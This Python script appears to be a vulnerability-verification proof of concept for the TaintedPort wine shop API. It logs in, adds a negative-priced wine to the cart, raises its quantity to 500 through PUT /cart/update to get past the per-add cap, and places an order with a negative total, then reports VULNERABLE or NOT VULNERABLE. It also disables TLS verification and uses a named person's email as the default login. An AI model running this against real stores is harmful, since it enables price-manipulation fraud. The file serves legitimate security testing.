     1	#!/usr/bin/env python3
     2	"""Verify: Negative-total order creation on TaintedPort.
     3	
     4	Exits 0 (VULNERABLE) if a durable order can be placed with a negative total.
     5	Exits 1 (NOT VULNERABLE) if either PUT /cart/update rejects out-of-range
     6	quantities OR POST /orders refuses a negative-total cart.
     7	
     8	Required environment variables:
     9	    ATTACKER_PASSWORD   Attacker's password
    10	
    11	Optional (override defaults):
    12	    TARGET_URL          Base URL (default: https://api.taintedport.com)
    13	    ATTACKER_USERNAME   Login email (default: luis.grangeia@snyk.io)
    14	    WINE_ID             Negative-priced wine id (default: 7)
    15	    QUANTITY            Amplified quantity to use via /cart/update (default: 500)
    16	
    17	Usage:
    18	    export ATTACKER_PASSWORD=...
    19	    python3 verify.py
    20	"""
    21	import os
    22	import sys
    23	import requests
    24	import urllib3
    25	
    26	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    27	
    28	TARGET_URL = os.environ.get("TARGET_URL", "https://api.taintedport.com")
    29	ATTACKER_USERNAME = os.environ.get("ATTACKER_USERNAME", "luis.grangeia@snyk.io")
    30	ATTACKER_PASSWORD = os.environ.get("ATTACKER_PASSWORD")
    31	WINE_ID = int(os.environ.get("WINE_ID", "7"))
    32	QUANTITY = int(os.environ.get("QUANTITY", "500"))
    33	
    34	REQUIRED_VARS = ["ATTACKER_PASSWORD"]
    35	
    36	
    37	def preflight():
    38	    missing = [v for v in REQUIRED_VARS if not os.environ.get(v)]
    39	    if missing:
    40	        print("ERROR: missing required environment variables:")
    41	        for v in missing:
    42	            print(f"  {v}")
    43	        print("\nExample:\n  export ATTACKER_PASSWORD=... && python3 verify.py")
    44	        sys.exit(1)
    45	
    46	
    47	def login(email, password):
    48	    r = requests.post(f"{TARGET_URL}/auth/login",
    49	                      json={"email": email, "password": password}, verify=False)
    50	    r.raise_for_status()
    51	    return r.json()["token"]
    52	
    53	
    54	def check():
    55	    preflight()
    56	    token = login(ATTACKER_USERNAME, ATTACKER_PASSWORD)
    57	    h = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    58	
    59	    # Confirm target wine is negative-priced (precondition)
    60	    wines = requests.get(f"{TARGET_URL}/wines?limit=100", headers=h, verify=False).json()
    61	    wines = wines.get("wines") if isinstance(wines, dict) else wines
    62	    wine = next((w for w in wines if w.get("id") == WINE_ID), None)
    63	    if not wine or wine.get("price", 0) >= 0:
    64	        print(f"[NOT VULNERABLE] wine_id={WINE_ID} is not negative-priced (price={wine and wine.get('price')}) — precondition removed")
    65	        sys.exit(1)
    66	
    67	    # Clear cart
    68	    cart = requests.get(f"{TARGET_URL}/cart", headers=h, verify=False).json()
    69	    for item in cart.get("items", []):
    70	        requests.delete(f"{TARGET_URL}/cart/remove/{item['wine_id']}", headers=h, verify=False)
    71	
    72	    # Add 1 unit (per-add cap 1..12), then amplify with PUT /cart/update
    73	    r = requests.post(f"{TARGET_URL}/cart/add", headers=h,
    74	                      json={"wine_id": WINE_ID, "quantity": 1}, verify=False)
    75	    if not r.json().get("success"):
    76	        print(f"[NOT VULNERABLE] /cart/add rejected qty=1: {r.text[:200]}")
    77	        sys.exit(1)
    78	
    79	    r = requests.put(f"{TARGET_URL}/cart/update", headers=h,
    80	                     json={"wine_id": WINE_ID, "quantity": QUANTITY}, verify=False)
    81	    if not r.json().get("success"):
    82	        print(f"[NOT VULNERABLE] /cart/update rejected qty={QUANTITY}: {r.text[:200]}")
    83	        sys.exit(1)
    84	
    85	    cart = requests.get(f"{TARGET_URL}/cart", headers=h, verify=False).json()
    86	    if cart.get("total", 0) >= 0:
    87	        print(f"[NOT VULNERABLE] Cart total is not negative: {cart.get('total')}")
    88	        sys.exit(1)
    89	
    90	    r = requests.post(f"{TARGET_URL}/orders", headers=h, json={
    91	        "shipping_address": {"name": "Verify", "street": "R.", "city": "Lx",
    92	                             "postal_code": "1000-000", "phone": "+351000000000"},
    93	        "delivery_notes": "verify"
    94	    }, verify=False)
    95	    if r.status_code != 201 or not r.json().get("success"):
    96	        print(f"[NOT VULNERABLE] POST /orders refused negative-total cart: HTTP {r.status_code} {r.text[:200]}")
    97	        sys.exit(1)
    98	
    99	    order_id = r.json().get("order_id")
   100	    order = requests.get(f"{TARGET_URL}/orders/{order_id}", headers=h, verify=False).json().get("order", {})
   101	    total = order.get("total")
   102	    if total is not None and total < 0 and order.get("status") == "pending":
   103	        print(f"[VULNERABLE] Durable order #{order_id} persisted with total={total}, status={order.get('status')}")
   104	        sys.exit(0)
   105	
   106	    print(f"[NOT VULNERABLE] Order #{order_id} did not persist with negative total (total={total}, status={order.get('status')})")
   107	    sys.exit(1)
   108	
   109	
   110	if __name__ == "__main__":
   111	    check()